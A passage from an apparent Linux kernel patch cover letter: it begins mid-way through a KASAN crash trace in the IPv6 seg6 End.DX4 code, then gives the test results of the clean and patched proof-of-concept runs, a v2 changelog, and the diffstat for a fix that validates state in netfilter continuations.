[  850.410219][    C0]  ? _copy_from_iter+0x14b/0x1710
[  850.411252][    C0]  ? __pfx__copy_from_iter+0x10/0x10
[  850.412295][    C0]  ? __sanitizer_cov_trace_switch+0x54/0x90
[  850.413441][    C0]  ? packet_parse_headers+0x283/0x840
[  850.414543][    C0]  ? __pfx_packet_parse_headers+0x10/0x10
[  850.415676][    C0]  packet_xmit+0x247/0x370
[  850.416863][    C0]  packet_sendmsg+0x30e4/0x4e10
[  850.418124][    C0]  ? sock_has_perm+0x21f/0x2c0
[  850.419439][    C0]  ? __pfx_sock_has_perm+0x10/0x10
[  850.420517][    C0]  ? __sanitizer_cov_trace_switch+0x54/0x90
[  850.421935][    C0]  ? tomoyo_socket_sendmsg_permission+0x13b/0x3a0
[  850.423117][    C0]  ? __pfx_packet_sendmsg+0x10/0x10
[  850.424152][    C0]  ? selinux_socket_sendmsg+0x18f/0x2e0
[  850.425211][    C0]  ? __pfx_packet_sendmsg+0x10/0x10
[  850.426219][    C0]  __sys_sendto+0x4c3/0x510
[  850.427185][    C0]  ? __pfx___sys_sendto+0x10/0x10
[  850.428211][    C0]  ? sock_ioctl+0x3c8/0x6a0
[  850.429235][    C0]  ? fd_install+0x23d/0x550
[  850.430240][    C0]  ? selinux_file_ioctl+0x189/0x280
[  850.431265][    C0]  ? selinux_file_ioctl+0xbb/0x280
[  850.432309][    C0]  __x64_sys_sendto+0xe0/0x1c0
[  850.433295][    C0]  ? lockdep_hardirqs_on+0x7d/0x110
[  850.434752][    C0]  do_syscall_64+0x128/0x7b0
[  850.436028][    C0]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  850.437445][    C0] RIP: 0033:0x44fefa
[  850.439474][    C0] Code: ec 01 00 00 66 2e 0f 1f 84 00 00 00 00 00 66 90 f3 0f 1e fa 41 89 ca 64 8b 04 25 18 00 00 00 85 c0 75 15 b8 2c 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 7e c3 0f 1f 44 00 00 41 54 48 83 ec 30 44 89
[  850.442927][    C0] RSP: 002b:00007ffe8cb6c048 EFLAGS: 00000246 ORIG_RAX: 000000000000002c
[  850.444883][    C0] RAX: ffffffffffffffda RBX: 00007ffe8cb6c328 RCX: 000000000044fefa
[  850.446352][    C0] RDX: 0000000000000056 RSI: 00007ffe8cb6c0b0 RDI: 0000000000000003
[  850.447805][    C0] RBP: 0000000000000003 R08: 00007ffe8cb6c050 R09: 0000000000000014
[  850.449691][    C0] R10: 0000000000000000 R11: 0000000000000246 R12: 00007ffe8cb6cf33
[  850.451169][    C0] R13: 00007ffe8cb6cf38 R14: 00000000004c97d0 R15: 0000000000000001
[  850.452729][    C0]  </TASK>
[  850.453476][    C0] Modules linked in:
[  850.456077][    C0] ---[ end trace 0000000000000000 ]---
[  850.457781][    C0] RIP: 0010:input_action_end_dx4_finish+0x7b/0x560
[  850.459335][    C0] Code: 0f 85 88 02 00 00 e8 74 17 65 f7 49 89 df 48 b8 00 00 00 00 00 fc ff df 49 83 e7 fe 49 8d bf 88 00 00 00 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 78 04 00 00 48 8d bd d0 00 00 00 4d 8b b7 88 00
[  850.462659][    C0] RSP: 0018:ffa0000000007890 EFLAGS: 00000206
[  850.464107][    C0] RAX: dffffc0000000000 RBX: 0000000000000000 RCX: 0000000000000101
[  850.465550][    C0] RDX: 0000000000000011 RSI: ffffffff8a5d14dc RDI: 0000000000000088
[  850.467086][    C0] RBP: ff11000030289280 R08: 0000000000000101 R09: ffe21c0006440374
[  850.468311][    C0] R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000000
[  850.469516][    C0] R13: ff110000302892d8 R14: 0000000000000000 R15: 0000000000000000
[  850.470737][    C0] FS:  000000001910f3c0(0000) GS:ff110000d566e000(0000) knlGS:0000000000000000
[  850.472075][    C0] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  850.473161][    C0] CR2: 000000000049bfe0 CR3: 0000000030265000 CR4: 00000000007516f0
[  850.474633][    C0] PKRU: 55555554
[  850.475999][    C0] Kernel panic - not syncing: Fatal exception in interrupt
[  850.478692][    C0] Kernel Offset: disabled
[  850.480208][    C0] Rebooting in 86400 seconds..
-----END clean crash log-----

Testing:

- The clean End.DX4 DNAT PoC reproduced a KASAN NULL dereference in
  input_action_end_dx4_finish+0x7b/0x560, followed by a fatal exception.
- The patched End.DX4 PoC returned DX4_POC_EXIT=0 without a KASAN report,
  Oops, or panic.
- The patched SNAT+ESP/XFRM PoC ran twice. One run returned
  XFRM_POC_EXIT=0; both returned to the guest shell without a kernel
  fault. No ping reply was expected from the test destination.
- The guest did not contain cc1; the static x86_64 PoC was compiled on
  the host and executed only inside the QEMU guest.

Changes in v2:

- Add unlikely() to the new checks.
- Validate state types in both seg6local and seg6_iptunnel continuations
  and drop invalid state.
- Do not walk through XFRM dsts or take an extra lwtstate reference.
- Retain the seg6_input_core() loop-detection comment.
- Document both reproducer setups and clean/patched test results.
- v1 Link: https://lore.kernel.org/all/cover.1790748418.git.petalzu987@gmail.com/

Best regards,
Zixuan Chai

Zixuan Chai (1):
  seg6: validate state in netfilter continuations

 net/ipv6/seg6_iptunnel.c | 35 ++++++++++++++++++++++++++++++-----
 net/ipv6/seg6_local.c    | 38 ++++++++++++++++++++++++++++++++------
 2 files changed, 62 insertions(+), 11 deletions(-)

-- 
2.34.1

